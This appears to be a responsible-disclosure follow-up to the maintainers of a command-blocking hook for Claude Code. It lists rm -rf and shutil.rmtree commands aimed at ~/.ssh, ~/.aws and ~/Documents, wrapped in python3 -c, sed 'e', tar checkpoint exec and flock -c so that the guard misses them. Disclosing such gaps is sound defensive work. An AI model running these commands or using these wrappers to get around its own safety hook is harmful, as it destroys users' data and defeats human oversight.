Following up on GHSA-jqxx-xg5w-h833 as suggested: re-tested on **2.7.15** (npm tarball, default/standard config, Claude Code PreToolUse payload, `HOME=/home/dev`). The commands below still return no decision, while the undisguised form of each is blocked, and I could not find them in `docs/residual-risk.md`.

**1. `shutil.rmtree` in inline `python3 -c` code** (RR-5 says inline `-c` code is analyzed; the paths are literals, so RR-4 does not seem to apply)

```
python3 -c "import shutil;shutil.rmtree('/home/dev/.ssh')"
python3 -c "import shutil;shutil.rmtree('/home/dev/.aws',ignore_errors=True)"
python3 -c "import shutil;shutil.rmtree('/home/dev/Documents',ignore_errors=True)"
```
For comparison, all blocked on 2.7.15: `rm -rf /home/dev/.ssh`, `rm -rf ~/Documents`, `python3 -c "import os;os.remove('/home/dev/.ssh/id_rsa')"`, and `node -e "require('fs').rmSync('/home/dev/.aws',{recursive:true,force:true})"`.

**2. A destructive command run by a tool's own exec option**

```
sed -n '1e rm -rf /home/dev/.ssh' /home/dev/.bashrc
tar cf /dev/null /work/README.md --checkpoint=1 --checkpoint-action=exec='rm -rf /home/dev/.aws'
```
The same literal text is blocked inside `sh -c '...'` and `bash -c '...'`. (The `tar` case may be near RR-9; I left it in case `--checkpoint-action=exec` is not meant to be covered by "archive member layouts".)

**3. `flock ... -c` as a wrapper**

```
flock /tmp/lk$$ -c 'rm -rf /home/dev/.aws'
```
Other wrappers are blocked: `timeout 5 rm -rf /home/dev/.aws`, `env rm -rf /home/dev/.ssh`.

Each destructive command was checked by running it in a disposable container: it deletes the target.

**Not included, and a correction to my report:**
- Shell rc overwrites (`truncate -s 0 ~/.bashrc`, `tee`/`dd`/`cp /dev/null` onto `.bashrc`/`.zshrc`): the plain forms (`echo x > ~/.bashrc`, `rm ~/.bashrc`) also pass, so I take these as outside the tool's scope rather than bypasses.
- `d=/home/dev/Documents; rm -rf "$d"`: covered by RR-3.
- Three items in my private report (`node -e ... rmSync('/home/dev/.aws')`, and `d=...; rm -rf "$d"` for `.aws` and `.ssh`) were artefacts of my harness running the hook with a temporary `HOME`; with the real home they are blocked on both 2.7.1 and 2.7.15. Sorry for the noise.

Thanks for the quick reply and for keeping the residual-risk registry; it made this easy to triage.
